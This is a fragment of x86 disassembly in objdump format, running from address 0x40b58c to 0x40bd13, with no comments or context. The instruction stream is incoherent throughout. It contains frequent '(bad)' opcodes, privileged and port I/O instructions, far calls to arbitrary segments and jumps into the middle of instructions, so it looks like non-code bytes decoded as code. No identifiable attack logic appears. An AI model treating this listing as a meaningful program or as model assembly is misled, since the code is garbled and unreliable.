  40b58c:	sbb    ebx,DWORD PTR [edi+0x54]
  40b58f:	jecxz  0x40b544
  40b591:	mov    fs,ebx
  40b593:	sub    eax,0xd0d554f1
  40b598:	sbb    dl,0x8c
  40b59b:	fwait
  40b59c:	lods   eax,DWORD PTR gs:[esi]
  40b59e:	out    0xd7,eax
  40b5a0:	push   cs
  40b5a1:	mov    eax,0x3d69fbe7
  40b5a6:	aad    0xb7
  40b5a8:	imul   esp,ebx,0xffffffdd
  40b5ab:	mov    ds:0xe49d39c,al
  40b5b0:	hlt    
  40b5b1:	in     al,0x3a
  40b5b3:	xor    bh,BYTE PTR [edx]
  40b5b5:	cmp    ah,al
  40b5b7:	mov    cl,0x5b
  40b5b9:	add    DWORD PTR [ecx+0x31559dc1],ebx
  40b5bf:	mov    ds:0xbd1be241,al
  40b5c4:	mov    edi,0x23f4712c
  40b5c9:	push   ebp
  40b5ca:	adc    edx,esp
  40b5cc:	es jb  0x40b5d5
  40b5cf:	ds xchg ecx,eax
  40b5d1:	and    bl,ch
  40b5d3:	sub    eax,0x7b56ef4d
  40b5d8:	popa   
  40b5d9:	or     BYTE PTR [esi-0x4c],ah
  40b5dc:	push   es
  40b5dd:	dec    ecx
  40b5de:	xor    edx,DWORD PTR [eax]
  40b5e0:	pop    esi
  40b5e1:	loopne 0x40b56c
  40b5e3:	pushf  
  40b5e4:	(bad)  [ecx-0x6a]
  40b5e7:	and    al,0xa4
  40b5e9:	push   ss
  40b5ea:	je     0x40b5ce
  40b5ec:	imul   esp,DWORD PTR [ebx+ecx*8-0x73dff90d],0x2383534a
  40b5f7:	xchg   edx,eax
  40b5f8:	xchg   BYTE PTR [eax+0x7a],dl
  40b5fb:	add    eax,0xe761cd9d
  40b600:	ret    
  40b601:	jl     0x40b659
  40b603:	mov    BYTE PTR [ebp+0x3d],ah
  40b606:	ror    BYTE PTR [ebx-0x5b],1
  40b609:	push   cs
  40b60a:	dec    ebx
  40b60b:	lds    ebp,FWORD PTR [ebp-0x7d0c2534]
  40b611:	and    al,0x58
  40b613:	inc    ecx
  40b614:	add    edi,DWORD PTR [eax+ebp*1-0xbeec3a5]
  40b61b:	mov    WORD PTR [esp+edx*2-0x2fc2bfcb],?
  40b622:	loop   0x40b5b1
  40b624:	xlat   BYTE PTR ds:[ebx]
  40b625:	stos   BYTE PTR es:[edi],al
  40b626:	jecxz  0x40b678
  40b628:	imul   esi,DWORD PTR [ecx-0x6b4ccdc0],0x6a
  40b62f:	cmp    eax,ebx
  40b631:	lock pop esp
  40b633:	out    0xd9,eax
  40b635:	add    ebp,DWORD PTR [edx+0x2]
  40b638:	mov    eax,ds:0x2b692771
  40b63d:	fidiv  DWORD PTR [ebx+0x46475d17]
  40b643:	mov    al,fs:0xc981ec60
  40b649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b64a:	jl     0x40b6a9
  40b64c:	pop    edi
  40b64d:	xchg   DWORD PTR [edx+0x44],esi
  40b650:	fnstsw WORD PTR [ebx]
  40b652:	adc    edi,DWORD PTR [eax+0x1a]
  40b655:	add    eax,0x8f765b77
  40b65a:	int    0x6c
  40b65c:	add    eax,0x7b0604e1
  40b661:	sbb    DWORD PTR [ebx-0x1a],0x1c
  40b665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b666:	xor    BYTE PTR [ebp+0x0],cl
  40b669:	push   eax
  40b66a:	clc    
  40b66b:	mov    ebp,0xfaf56ea
  40b670:	outs   dx,BYTE PTR ds:[esi]
  40b671:	jb     0x40b6e5
  40b673:	mov    eax,ds:0xa237e48
  40b678:	ror    BYTE PTR [eax-0x6fd56b5e],cl
  40b67e:	out    0xff,eax
  40b680:	out    dx,al
  40b681:	test   eax,0x9278e7ad
  40b686:	xlat   BYTE PTR ds:[ebx]
  40b687:	jl     0x40b65a
  40b689:	scas   al,BYTE PTR es:[edi]
  40b68a:	ds xchg ebx,eax
  40b68c:	cmp    bl,BYTE PTR es:[ecx+0x36]
  40b690:	repnz add al,0x1d
  40b693:	sub    ecx,DWORD PTR [edx+0x26]
  40b696:	jmp    0x40b65e
  40b698:	aas    
  40b699:	call   0x501c2ba5
  40b69e:	outs   dx,DWORD PTR ds:[esi]
  40b69f:	lock sar DWORD PTR [ecx-0x2d2b4da3],1
  40b6a6:	in     eax,dx
  40b6a7:	mov    dl,0x50
  40b6a9:	add    BYTE PTR [ebx+0x0],ah
  40b6ac:	mov    eax,0xfb909c25
  40b6b1:	jnp    0x40b69a
  40b6b3:	sar    eax,0xc8
  40b6b6:	adc    ecx,DWORD PTR ds:0xc38f2259
  40b6bc:	add    ch,bh
  40b6be:	pop    ss
  40b6bf:	add    al,0xe0
  40b6c1:	inc    esi
  40b6c2:	sbb    edi,edi
  40b6c4:	call   0x849dd57c
  40b6c9:	pop    edi
  40b6ca:	or     ebx,DWORD PTR [eax+eax*2-0x20fc9f96]
  40b6d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6d2:	mov    bh,0x16
  40b6d4:	push   ecx
  40b6d5:	leave  
  40b6d6:	into   
  40b6d7:	aad    0xef
  40b6d9:	push   eax
  40b6da:	mov    eax,DWORD PTR [eax+esi*8+0x30d9a93a]
  40b6e1:	inc    ecx
  40b6e2:	add    al,BYTE PTR [ebp-0x57]
  40b6e5:	inc    ebp
  40b6e6:	leave  
  40b6e7:	stos   DWORD PTR es:[edi],eax
  40b6e8:	imul   edx,DWORD PTR [eax-0x15b01e9d],0x15
  40b6ef:	int3   
  40b6f0:	shl    ah,cl
  40b6f2:	mov    ds:0xca24c145,eax
  40b6f7:	call   0x55d9:0x244c60d1
  40b6fe:	xor    eax,DWORD PTR [ebx-0x3f]
  40b701:	adc    esi,DWORD PTR [ebp-0x1608752a]
  40b707:	and    esp,DWORD PTR [edx+0x4e]
  40b70a:	int3   
  40b70b:	cld    
  40b70c:	and    bh,bh
  40b70e:	mov    ebp,0xfb5910ac
  40b713:	xor    BYTE PTR [esi-0x4aa0ab89],0x8f
  40b71a:	ret    
  40b71b:	jecxz  0x40b6e7
  40b71d:	(bad)  
  40b71f:	aam    0xbc
  40b721:	leave  
  40b722:	rcl    dh,0x34
  40b725:	faddp  st(7),st
  40b727:	cmp    BYTE PTR [eax-0x59],al
  40b72a:	jo     0x40b6b0
  40b72c:	out    0x90,al
  40b72e:	pop    edi
  40b72f:	fs mov ah,0x43
  40b732:	sub    DWORD PTR [esi+ebx*8-0x63e7a6bc],esp
  40b739:	dec    ebx
  40b73a:	addr16 inc esp
  40b73c:	mov    eax,ds:0x5f26b118
  40b741:	mov    esp,0x5267fda4
  40b746:	test   DWORD PTR [esi-0x7a1206c],0x49dcc3f5
  40b750:	popf   
  40b751:	hlt    
  40b752:	sbb    al,0x25
  40b754:	bound  esp,QWORD PTR [ecx]
  40b756:	jge    0x40b79c
  40b758:	jns    0x40b7b0
  40b75a:	aad    0x6d
  40b75c:	jne    0x40b708
  40b75e:	lahf   
  40b75f:	mov    dh,0x86
  40b761:	clc    
  40b762:	inc    esi
  40b763:	xor    eax,0x4767fe35
  40b768:	cmc    
  40b769:	imul   esp,DWORD PTR [eax],0x33
  40b76c:	jo     0x40b6f5
  40b76e:	daa    
  40b76f:	loope  0x40b74e
  40b771:	fcomip st,st(1)
  40b773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b774:	pop    edi
  40b775:	mov    eax,ds:0xe4a3eb18
  40b77a:	mov    eax,0x4e7f7051
  40b77f:	add    ebx,DWORD PTR [esi-0x44]
  40b782:	cli    
  40b783:	jmp    0x8bdf7606
  40b788:	and    eax,0x451234a7
  40b78d:	xchg   ebp,eax
  40b78e:	xor    al,0x33
  40b790:	mov    BYTE PTR [edx-0x5cbf11fe],cl
  40b796:	jp     0x40b751
  40b798:	shr    BYTE PTR [ebx+eiz*8+0x374f15d0],1
  40b79f:	jne    0x40b796
  40b7a1:	xor    ah,BYTE PTR [ebx-0x71]
  40b7a4:	or     BYTE PTR [edi-0x2d8d4405],0xdf
  40b7ab:	lahf   
  40b7ac:	dec    eax
  40b7ad:	cld    
  40b7ae:	iret   
  40b7af:	test   al,0xee
  40b7b1:	out    0x2c,eax
  40b7b3:	and    ebp,DWORD PTR [ebx]
  40b7b5:	pop    edi
  40b7b6:	nop
  40b7b7:	add    al,cl
  40b7b9:	bound  edi,QWORD PTR [esi]
  40b7bb:	(bad)  
  40b7bc:	out    dx,al
  40b7bd:	aam    0xe1
  40b7bf:	mov    ch,0x17
  40b7c1:	sti    
  40b7c2:	inc    ebp
  40b7c3:	add    al,0x4e
  40b7c6:	cmp    eax,0x4a637d6d
  40b7cb:	lock imul edi,DWORD PTR [edi],0x9b4e149c
  40b7d2:	dec    ebp
  40b7d3:	jg     0x40b845
  40b7d5:	mov    esi,0x630c80c8
  40b7da:	sbb    edx,DWORD PTR [edx-0x2334e953]
  40b7e0:	int3   
  40b7e1:	lods   al,BYTE PTR ds:[esi]
  40b7e2:	xchg   DWORD PTR [edi+0x7e3f6934],esi
  40b7e8:	scas   eax,DWORD PTR es:[edi]
  40b7e9:	out    0xbf,eax
  40b7eb:	mov    edx,0x3171499a
  40b7f0:	test   eax,0x3b0df689
  40b7f5:	stos   DWORD PTR es:[edi],eax
  40b7f6:	fsubrp st(0),st
  40b7f8:	xchg   esp,eax
  40b7f9:	mov    ch,0x18
  40b7fb:	cmp    BYTE PTR [ebx+0x2a],bl
  40b7fe:	lods   al,BYTE PTR ds:[esi]
  40b7ff:	jb     0x40b784
  40b801:	test   eax,0x7a67255e
  40b806:	retf   
  40b807:	ret    
  40b808:	cld    
  40b809:	adc    edx,0x8
  40b80c:	hlt    
  40b80d:	fisttp DWORD PTR [ebx+0x3a]
  40b810:	xchg   ebx,eax
  40b811:	sub    eax,0x30e2b7b5
  40b816:	ds jmp 0x40b886
  40b819:	loop   0x40b857
  40b81b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40b81d:	add    ch,dh
  40b81f:	pusha  
  40b820:	cmp    eax,0x65ee79f8
  40b825:	xchg   ecx,eax
  40b826:	pop    ecx
  40b827:	mov    DWORD PTR [ebp-0x7cd846c5],0x3e519af6
  40b831:	nop
  40b832:	js     0x40b7fb
  40b834:	jne    0x40b842
  40b836:	cs mov edx,0x784ddb79
  40b83c:	mov    DWORD PTR fs:[ecx+0x6f4beada],ebp
  40b843:	call   0x2849:0xe333993f
  40b84a:	cs daa 
  40b84c:	ret    0x68ae
  40b84f:	ret    0xf313
  40b852:	push   es
  40b853:	jb     0x40b7dc
  40b855:	clc    
  40b856:	iret   
  40b857:	push   es
  40b858:	ret    
  40b859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b85a:	je     0x40b895
  40b85c:	push   ss
  40b85d:	data16 mov bl,0xfb
  40b860:	test   eax,0xea44d85a
  40b865:	lds    edi,FWORD PTR [edx]
  40b867:	shl    edi,0x1f
  40b86a:	nop
  40b86b:	data16 shl bl,cl
  40b86e:	sub    al,0x5f
  40b870:	call   0xe286d935
  40b875:	or     DWORD PTR [ebp+0x60],esi
  40b878:	add    BYTE PTR [ecx+0x34274919],al
  40b87e:	sbb    BYTE PTR [edi+eiz*4-0x27],dh
  40b882:	bound  eax,QWORD PTR [edi]
  40b884:	pop    ebp
  40b885:	repnz inc ebx
  40b887:	les    esi,FWORD PTR [esi]
  40b889:	cmp    edx,DWORD PTR ds:0x16f3001b
  40b88f:	inc    ecx
  40b890:	adc    DWORD PTR [edi],edi
  40b892:	cmp    edi,DWORD PTR [ebx+0x46417e24]
  40b898:	js     0x40b86f
  40b89a:	cmp    ch,BYTE PTR [eax+edx*8]
  40b89d:	sar    edi,1
  40b89f:	retf   
  40b8a0:	xlat   BYTE PTR ds:[ebx]
  40b8a1:	jne    0x40b8d1
  40b8a3:	mov    bl,0x1
  40b8a5:	cmp    BYTE PTR [edx-0x1],cl
  40b8a8:	sub    edi,eax
  40b8aa:	adc    BYTE PTR [ebx],bl
  40b8ac:	enter  0x6330,0x5a
  40b8b0:	jecxz  0x40b90b
  40b8b2:	mov    ebx,0x840ce8af
  40b8b7:	fneni(8087 only) 
  40b8b9:	mov    eax,0x919b62e7
  40b8be:	lods   al,BYTE PTR ds:[esi]
  40b8bf:	pop    esp
  40b8c0:	mov    ecx,0x82984cec
  40b8c5:	(bad)  
  40b8c6:	mov    bh,0x3d
  40b8c8:	call   0xbbd20f39
  40b8cd:	mov    esp,0xe1b19d30
  40b8d2:	pop    esp
  40b8d3:	(bad)  
  40b8d4:	fmulp  st(6),st
  40b8d6:	fild   WORD PTR [ebx+0x7b86e5c4]
  40b8dc:	adc    al,0x97
  40b8de:	cmp    eax,ecx
  40b8e0:	ret    0x4658
  40b8e3:	std    
  40b8e4:	mov    al,0x2c
  40b8e6:	adc    al,0x94
  40b8e8:	or     al,BYTE PTR [ebx]
  40b8ea:	xor    edx,DWORD PTR [ebp+0x4544ff25]
  40b8f0:	or     eax,0xd9779a00
  40b8f5:	jmp    0xd2ce:0xa813e6eb
  40b8fc:	sub    DWORD PTR [ebp-0x45],0x7a
  40b900:	add    DWORD PTR [ecx],0x289b03ee
  40b906:	imul   ebx,DWORD PTR [edx],0x66
  40b909:	xchg   DWORD PTR [eax],ecx
  40b90b:	(bad)  [edi-0x2b8aa34e]
  40b911:	jno    0x40b8ee
  40b913:	idiv   DWORD PTR [ebx]
  40b915:	fdiv   DWORD PTR [edi+0x21ff3771]
  40b91b:	inc    esi
  40b91c:	or     DWORD PTR [eax-0x1c11a397],ebx
  40b922:	retf   0xfaf3
  40b925:	push   esi
  40b926:	mov    ecx,0x6c9b797e
  40b92b:	and    bh,0x1
  40b92e:	xchg   edx,eax
  40b92f:	dec    edx
  40b930:	adc    BYTE PTR [ecx-0x5170c9e2],0xd6
  40b937:	cwde   
  40b938:	dec    eax
  40b939:	or     DWORD PTR [eax+0x3d],ebp
  40b93c:	cmp    cl,BYTE PTR [eax]
  40b93e:	sub    al,0xaf
  40b940:	add    al,0x7d
  40b942:	ja     0x40b92c
  40b944:	out    dx,eax
  40b945:	mov    ebp,DWORD PTR [ecx-0x59]
  40b948:	push   eax
  40b949:	(bad)  
  40b94a:	jge    0x40b8f3
  40b94c:	jnp    0x40b943
  40b94e:	sub    esp,DWORD PTR [eax-0x656b9db4]
  40b954:	fist   WORD PTR [esp+edx*4-0xd]
  40b958:	cmp    al,0xb3
  40b95a:	aam    0x5b
  40b95c:	int    0xa4
  40b95e:	arpl   WORD PTR [esp+ecx*1+0x37],di
  40b962:	call   0x7744:0x9ab864cf
  40b969:	push   cs
  40b96a:	inc    ebx
  40b96b:	xchg   DWORD PTR [esp+ecx*8+0x57450f91],esp
  40b972:	sub    ebp,ebp
  40b974:	xor    dl,BYTE PTR [ecx+0x3a]
  40b977:	jbe    0x40b96c
  40b979:	inc    ecx
  40b97a:	mov    es,WORD PTR [edi]
  40b97c:	add    al,0x34
  40b97e:	in     eax,dx
  40b97f:	nop
  40b980:	aam    0x2d
  40b982:	mov    ds:0x59bbc54c,al
  40b987:	xchg   BYTE PTR [edi+0x3b],dl
  40b98a:	jbe    0x40b996
  40b98c:	lds    ebx,FWORD PTR ds:0xe60f8fed
  40b992:	loope  0x40b9cc
  40b994:	sbb    eax,0x704c5d15
  40b999:	imul   esp,edx,0x22
  40b99c:	mov    ds:0xbb426b2,eax
  40b9a1:	je     0x40b93f
  40b9a3:	dec    esp
  40b9a4:	leave  
  40b9a5:	jae    0x40b98c
  40b9a7:	mov    eax,ds:0x859e8c44
  40b9ac:	mov    eax,0xcf37019
  40b9b1:	idiv   DWORD PTR [ecx-0x40b6090b]
  40b9b7:	retf   
  40b9b8:	fnsave [ebp+0x63d78862]
  40b9be:	mov    al,ds:0x2d85c632
  40b9c3:	std    
  40b9c4:	popa   
  40b9c5:	(bad)  
  40b9c6:	or     edx,DWORD PTR [ecx-0x7ab75574]
  40b9cc:	push   ebx
  40b9cd:	das    
  40b9ce:	xchg   ebp,edi
  40b9d0:	pop    eax
  40b9d1:	mov    ds:0xc29be744,eax
  40b9d6:	cmp    DWORD PTR [ecx-0x5c],ecx
  40b9d9:	(bad)  
  40b9da:	push   0xc148f5b2
  40b9df:	out    dx,eax
  40b9e0:	rcl    DWORD PTR [ebx+ecx*2+0x28],1
  40b9e4:	adc    eax,0x91c0da1
  40b9e9:	xchg   BYTE PTR [edx-0x1ada90b6],dh
  40b9ef:	(bad)  
  40b9f0:	lock jge 0x40ba16
  40b9f3:	mov    al,0x1c
  40b9f5:	sbb    ecx,ebp
  40b9f7:	adc    BYTE PTR [edi],al
  40b9f9:	mov    esp,0x39885620
  40b9fe:	and    ecx,edx
  40ba00:	dec    ebx
  40ba01:	add    al,0x2d
  40ba03:	pop    eax
  40ba04:	sbb    DWORD PTR [ebx+0x3b],ebx
  40ba07:	mov    esp,0x9158abc5
  40ba0c:	inc    edi
  40ba0d:	rcr    dh,0xf3
  40ba10:	aas    
  40ba11:	cmc    
  40ba12:	test   DWORD PTR [ebp+0x65f5e9b5],esp
  40ba18:	pop    ebx
  40ba19:	sbb    ecx,ecx
  40ba1b:	and    BYTE PTR [esi+esi*2],al
  40ba1e:	xlat   BYTE PTR ds:[ebx]
  40ba1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba20:	(bad)  
  40ba21:	xlat   BYTE PTR ds:[ebx]
  40ba22:	jg     0x40ba69
  40ba24:	test   DWORD PTR [eax*2-0x27d7abf],0x61fae11
  40ba2f:	ds repz pop ss
  40ba32:	or     ebp,DWORD PTR [ecx]
  40ba34:	fisttp WORD PTR ds:0xc05891cd
  40ba3a:	dec    esp
  40ba3b:	int    0x36
  40ba3d:	fwait
  40ba3e:	adc    esp,eax
  40ba40:	fidivr WORD PTR [edx+esi*1]
  40ba43:	dec    ebp
  40ba44:	frstor [eax-0x1df3274f]
  40ba4a:	daa    
  40ba4b:	jp     0x40b9f1
  40ba4d:	xchg   ebp,eax
  40ba4e:	aad    0xc2
  40ba50:	fnstcw WORD PTR [ecx]
  40ba52:	int3   
  40ba53:	jl     0x40babd
  40ba55:	out    0x93,al
  40ba57:	shl    DWORD PTR [esi+0xe],1
  40ba5a:	mov    ecx,0x381400ca
  40ba5f:	dec    ebx
  40ba60:	in     eax,0x57
  40ba62:	ror    BYTE PTR [esi],1
  40ba64:	cld    
  40ba65:	inc    esp
  40ba66:	dec    esp
  40ba67:	mov    bh,0x46
  40ba69:	push   ds
  40ba6a:	imul   DWORD PTR [eax+0x55]
  40ba6d:	mov    esi,0xe515c623
  40ba72:	or     cl,BYTE PTR [edi]
  40ba74:	out    dx,eax
  40ba75:	inc    edx
  40ba76:	div    DWORD PTR [ecx]
  40ba78:	jecxz  0x40badd
  40ba7a:	sbb    DWORD PTR [ebx-0x3f],esp
  40ba7d:	arpl   dx,ax
  40ba7f:	repnz sub eax,0xae507004
  40ba85:	xchg   edx,eax
  40ba86:	mov    esp,0x7d0b91da
  40ba8b:	xchg   edx,eax
  40ba8c:	imul   ebp,DWORD PTR [ebp-0x2a],0x1e20027a
  40ba93:	add    dh,BYTE PTR [ebx]
  40ba95:	(bad)  
  40ba96:	push   ds
  40ba97:	lock jae 0x40ba74
  40ba9a:	enter  0x1d10,0xe3
  40ba9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba9f:	popf   
  40baa0:	sbb    BYTE PTR [edi],dl
  40baa2:	jecxz  0x40bb1b
  40baa4:	cmp    dl,BYTE PTR [ebx+0x2a06ccd9]
  40baaa:	fistp  DWORD PTR [ebx-0x58]
  40baad:	mov    esp,0x928a9958
  40bab2:	out    dx,eax
  40bab3:	jb     0x40bad1
  40bab5:	add    al,0xdc
  40bab7:	lods   al,BYTE PTR ds:[esi]
  40bab8:	jnp    0x40ba4a
  40baba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40babb:	call   0xb72c111a
  40bac0:	push   0x9eb4655f
  40bac5:	xchg   ecx,eax
  40bac6:	sub    eax,0x6bb2e8cf
  40bacb:	sub    eax,0x21b4dafd
  40bad0:	pop    eax
  40bad1:	into   
  40bad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad3:	sbb    DWORD PTR [ebp+0x34daaa13],0x9ffd060b
  40badd:	jb     0x40baf2
  40badf:	inc    edi
  40bae0:	test   BYTE PTR [edi-0x67],bl
  40bae3:	jno    0x40baf0
  40bae5:	das    
  40bae6:	(bad)  
  40bae7:	xlat   BYTE PTR ds:[ebx]
  40bae8:	push   cs
  40bae9:	xchg   ebp,eax
  40baea:	mov    eax,0x7dc82aa1
  40baef:	push   ebx
  40baf0:	dec    edx
  40baf1:	aam    0xba
  40baf3:	out    0x59,eax
  40baf5:	shr    DWORD PTR [ebp-0xaed9a9d],cl
  40bafb:	jp     0x40ba89
  40bafd:	jbe    0x40baa6
  40baff:	inc    ebx
  40bb00:	push   0xc9fb586
  40bb05:	cdq    
  40bb06:	mov    dl,0xa1
  40bb08:	jae    0x40bb4b
  40bb0a:	call   0xa43ed7e4
  40bb0f:	ds out 0xe5,al
  40bb12:	out    dx,al
  40bb13:	(bad)  
  40bb14:	test   dh,ah
  40bb16:	cmp    DWORD PTR [esi-0x672d3335],eax
  40bb1c:	das    
  40bb1d:	xchg   ebx,eax
  40bb1e:	pop    esp
  40bb1f:	fs hlt 
  40bb21:	sahf   
  40bb22:	xchg   ebp,eax
  40bb23:	jle    0x40bb50
  40bb25:	pop    DWORD PTR [edx]
  40bb27:	iret   
  40bb28:	mov    ds:0x39e37d1e,al
  40bb2d:	cmc    
  40bb2e:	mov    dh,0x0
  40bb30:	lods   eax,DWORD PTR ds:[esi]
  40bb31:	repnz pusha 
  40bb33:	scas   eax,DWORD PTR es:[edi]
  40bb34:	xchg   ecx,eax
  40bb35:	add    al,0x4a
  40bb37:	pushf  
  40bb38:	xor    DWORD PTR [ebp+ebx*2+0x75fa8d1d],edi
  40bb3f:	lds    ebx,FWORD PTR [ecx+0x4e39450d]
  40bb45:	xor    DWORD PTR [ecx+0x5f],edi
  40bb48:	xchg   esi,eax
  40bb49:	sub    ebx,esp
  40bb4b:	jmp    0x772a:0x42175474
  40bb52:	xor    al,ah
  40bb54:	imul   ebx,DWORD PTR [ebp+0x26dbc388],0x14aeb541
  40bb5e:	or     eax,0xf2322f68
  40bb63:	add    DWORD PTR [esi],edx
  40bb65:	jl     0x40bbbd
  40bb67:	into   
  40bb68:	jle    0x40bb9d
  40bb6a:	mov    dl,0xed
  40bb6c:	fidiv  DWORD PTR [edx]
  40bb6e:	push   ss
  40bb6f:	mov    dh,0x1f
  40bb71:	(bad)  
  40bb72:	push   bp
  40bb74:	pushf  
  40bb75:	ret    
  40bb76:	cmp    esi,DWORD PTR [eax+0x2e]
  40bb79:	aaa    
  40bb7a:	push   edx
  40bb7b:	idiv   bh
  40bb7d:	sbb    eax,0xfb425ca1
  40bb82:	call   0x42c1:0xbfff01bd
  40bb89:	cmp    DWORD PTR fs:[edi-0x53cc1c7a],ebp
  40bb90:	mov    ch,0xd4
  40bb92:	out    0x6,eax
  40bb94:	mov    al,0x30
  40bb96:	jnp    0x40bb47
  40bb98:	jne    0x40bb6d
  40bb9a:	push   ebx
  40bb9b:	hlt    
  40bb9c:	and    ah,ch
  40bb9e:	ret    0x1464
  40bba1:	push   0x8d5cf01a
  40bba6:	cld    
  40bba7:	(bad)  
  40bba8:	jbe    0x40bbdd
  40bbaa:	test   al,0xfb
  40bbac:	jo     0x40bb6d
  40bbae:	out    0x77,eax
  40bbb0:	xor    DWORD PTR [eax-0x66],esp
  40bbb3:	xchg   esi,eax
  40bbb4:	shl    DWORD PTR [eax-0x64],1
  40bbb7:	pop    ebp
  40bbb8:	or     BYTE PTR [esi+0x5d],dh
  40bbbb:	pop    edi
  40bbbc:	(bad)  
  40bbbd:	pushf  
  40bbbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbbf:	jle    0x40bbb3
  40bbc1:	popa   
  40bbc2:	sti    
  40bbc3:	jge    0x40bb50
  40bbc5:	mov    esp,0x13ee2bfb
  40bbca:	sub    dl,BYTE PTR [edi+ecx*1+0x49]
  40bbce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbcf:	icebp  
  40bbd0:	pop    edi
  40bbd1:	lods   eax,DWORD PTR ds:[esi]
  40bbd2:	and    eax,0xc4c1ebd0
  40bbd7:	push   esi
  40bbd8:	xlat   BYTE PTR ds:[ebx]
  40bbd9:	arpl   bp,cx
  40bbdb:	(bad)  
  40bbdc:	cmp    esi,DWORD PTR [ebp-0x45]
  40bbdf:	mov    ?,WORD PTR [esp+ebp*2-0x13ef5b02]
  40bbe6:	inc    edx
  40bbe7:	out    dx,eax
  40bbe8:	pop    ss
  40bbe9:	push   0x1d3056b7
  40bbee:	addr16 mov esi,0xf0f0e450
  40bbf4:	cmp    al,0x8f
  40bbf6:	jb     0x40bb7f
  40bbf8:	lods   al,BYTE PTR ds:[esi]
  40bbf9:	cli    
  40bbfa:	add    edi,ecx
  40bbfc:	inc    esi
  40bbfd:	push   cs
  40bbfe:	sbb    eax,DWORD PTR [eax+0x56]
  40bc01:	mov    dl,0x8
  40bc03:	xchg   edi,eax
  40bc04:	rol    ebx,cl
  40bc06:	dec    eax
  40bc07:	sub    eax,0x6d00be3e
  40bc0c:	jne    0x40bbcf
  40bc0e:	jb     0x40bbe8
  40bc10:	or     edx,DWORD PTR [esi+0x4d]
  40bc13:	out    dx,al
  40bc14:	jo     0x40bc40
  40bc16:	or     al,0xd4
  40bc18:	pop    ecx
  40bc19:	call   0x2bf6bc6d
  40bc1e:	or     edi,DWORD PTR [edi]
  40bc20:	repnz lods al,BYTE PTR ds:[esi]
  40bc22:	mov    al,0xf7
  40bc24:	dec    eax
  40bc25:	ret    0x835d
  40bc28:	xchg   ebx,eax
  40bc29:	mov    ch,0x7a
  40bc2b:	js     0x40bbff
  40bc2d:	jecxz  0x40bc61
  40bc2f:	call   0xae68084d
  40bc34:	lods   al,BYTE PTR ds:[esi]
  40bc35:	mov    fs:0xaf74851e,al
  40bc3b:	dec    esi
  40bc3c:	out    0x49,eax
  40bc3e:	xchg   esi,eax
  40bc3f:	mov    al,ds:0xe7827da9
  40bc44:	cdq    
  40bc45:	push   ebp
  40bc46:	ror    dl,cl
  40bc48:	push   edx
  40bc49:	jecxz  0x40bca3
  40bc4b:	ret    
  40bc4c:	sub    BYTE PTR [esi+0x36],ah
  40bc4f:	xor    DWORD PTR ds:0x9d27e001,edi
  40bc55:	mov    ecx,0x65b87dd0
  40bc5a:	push   eax
  40bc5b:	fs pop ss
  40bc5d:	icebp  
  40bc5e:	jg     0x40bca1
  40bc60:	test   BYTE PTR [edx],ah
  40bc62:	cli    
  40bc63:	xchg   esi,eax
  40bc64:	mov    ds:0xc1f9d8fc,eax
  40bc69:	and    edx,esp
  40bc6b:	xchg   esp,eax
  40bc6c:	in     eax,dx
  40bc6d:	popf   
  40bc6e:	enter  0x3c21,0xaa
  40bc72:	xor    al,ah
  40bc74:	push   ds
  40bc75:	(bad)  [eax-0x70ad614b]
  40bc7b:	or     eax,0x4ba29aeb
  40bc80:	push   ebp
  40bc81:	aam    0x39
  40bc83:	jmp    0x40bcdd
  40bc85:	sub    DWORD PTR [eax-0x2618a8ec],ecx
  40bc8b:	inc    edi
  40bc8c:	scas   eax,DWORD PTR es:[edi]
  40bc8d:	adc    ah,dl
  40bc8f:	nop
  40bc90:	mov    edi,0xa4c1d4e6
  40bc95:	(bad)  
  40bc96:	cli    
  40bc97:	sub    bl,bh
  40bc99:	adc    dh,bl
  40bc9b:	sbb    DWORD PTR ds:0x1e3a9f17,0xbb9a622
  40bca5:	loop   0x40bcdb
  40bca7:	rcr    DWORD PTR [eax],cl
  40bca9:	and    DWORD PTR [edx-0x5],esi
  40bcac:	les    ecx,FWORD PTR [edx+eax*8+0x28]
  40bcb0:	adc    al,dl
  40bcb2:	pop    ecx
  40bcb3:	jle    0x40bd02
  40bcb5:	mul    DWORD PTR [esi-0x24]
  40bcb8:	mov    fs,WORD PTR [edx+0x5c]
  40bcbb:	and    DWORD PTR [ebx-0x45],esi
  40bcbe:	iret   
  40bcbf:	(bad)  
  40bcc0:	iret   
  40bcc1:	or     eax,0x44f3f78
  40bcc6:	mov    bh,dl
  40bcc8:	scas   al,BYTE PTR es:[edi]
  40bcc9:	adc    BYTE PTR [ecx+esi*2-0xf],al
  40bccd:	cld    
  40bcce:	in     eax,dx
  40bccf:	and    esp,DWORD PTR [ebx+0x79]
  40bcd2:	loop   0x40bc7f
  40bcd4:	shr    BYTE PTR [ecx],1
  40bcd6:	sbb    ecx,DWORD PTR [edx+0x21a78865]
  40bcdc:	mov    BYTE PTR [esi],ah
  40bcde:	out    dx,al
  40bcdf:	inc    ecx
  40bce0:	rcl    BYTE PTR [esi],cl
  40bce2:	jns    0x40bca0
  40bce4:	pop    edx
  40bce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bce6:	and    eax,0xa1bd8860
  40bceb:	mov    edi,0xd4b51af0
  40bcf0:	mov    eax,DWORD PTR [ecx-0x2db7f2fc]
  40bcf6:	div    DWORD PTR [ebx]
  40bcf8:	into   
  40bcf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcfa:	dec    eax
  40bcfb:	and    BYTE PTR [edx],al
  40bcfd:	shl    BYTE PTR [eax+0x3fe8b254],0x79
  40bd04:	imul   eax,esi,0x9119187f
  40bd0a:	jg     0x40bce7
  40bd0c:	icebp  
  40bd0d:	call   edi
  40bd0f:	mov    ah,0x53
  40bd11:	fld    TBYTE PTR [eax]
  40bd13:	mov    al,BYTE PTR [esi-0x70ed1ec0]
